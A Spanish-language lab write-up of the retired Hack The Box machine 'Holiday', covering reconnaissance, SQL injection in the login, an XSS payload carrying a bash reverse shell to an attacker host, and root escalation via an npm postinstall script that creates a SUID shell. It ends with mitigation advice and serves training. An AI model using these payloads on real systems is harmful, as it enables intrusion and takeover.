---
machine: Holiday
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, web, nodejs, sqli, xss, command-injection, npm, privesc]
---

# Holiday — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El login de Holiday es inyectable y un UNION revela el hash de `RickA`. Un XSS en la reserva se ejecuta en el panel del administrador y permite aprobar una reserva con command injection, lo que da shell como `algernon`. La escalada es directa: `algernon` puede ejecutar `npm i *` como root y un `package.json` con scripts de instalación ejecuta código.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` SSH y `80` una aplicación Node.js.
- `gobuster` encuentra `/login`, `/register`, `/bookings` y `/admin`.
- El login diferencia entre usuario inválido y contraseña incorrecta.

## Enumeración

- El campo de usuario se concatena en SQLite.
- Un `UNION` devuelve el hash MD5 de `RickA`, que se crackea.
- El panel de administración revisa las reservas y renderiza su contenido.

```text
username=")) UNION SELECT 1,group_concat(username),3,4 FROM users-- -
```

## Foothold

Se crea una reserva con XSS; cuando el administrador la revisa, el script ejecuta una acción en su sesión. La aprobación pasa el ID de la reserva a un comando del sistema, así que se inyecta una reverse shell y se recibe como `algernon`.

```text
"><script>fetch('/admin/approve?id=<ID>;bash -c "bash -i >& /dev/tcp/<ATTACKER>/443 0>&1"')</script>
```

## Movimiento lateral

La shell ya es `algernon`; su home contiene `user.txt`. La enumeración de privilegios muestra una regla para ejecutar npm como root.

```bash
sudo -l
```

## Escalada de privilegios

`npm i *` como root instala el paquete del directorio actual y ejecuta sus scripts `preinstall`/`postinstall`. Se crea un `package.json` con un script que copia bash y le pone SUID, y se lanza la instalación.

```json
{
  "name": "pwn",
  "version": "1.0.0",
  "scripts": { "postinstall": "cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash" }
}
```

```bash
sudo npm i . --unsafe
/tmp/rootbash -p
```

## Evidencia

- SQLi en el login y hash de `RickA`.
- XSS en la reserva y sesión del admin.
- Command injection en la aprobación.
- Regla de npm como root.
- `package.json` con `postinstall` y shell SUID.

## Lecciones aprendidas

- Un login con mensajes distintos filtra usuarios y permite UNION.
- El XSS contra un bot administrador puede encadenarse con una acción privilegiada.
- `npm install` ejecuta scripts de paquetes; como root es ejecución directa.
- Las reglas de sudo sobre gestores de paquetes deben tratarse como root.

## Mitigación y detección

- Parametrizar el login y no devolver errores distintos.
- Escapar las reservas y usar CSP; no renderizar HTML del usuario.
- No permitir `npm` como root ni instalar paquetes de directorios no confiables.
- Auditar reglas de sudo y scripts de instalación.

## Referencias

- [0xdf — Holiday](https://0xdf.gitlab.io/2019/09/11/htb-holiday.html)
- [IppSec — Holiday](https://www.youtube.com/watch?v=FvHyt7KrsPE)
- [Hack The Box — Holiday](https://app.hackthebox.com/machines/holiday)
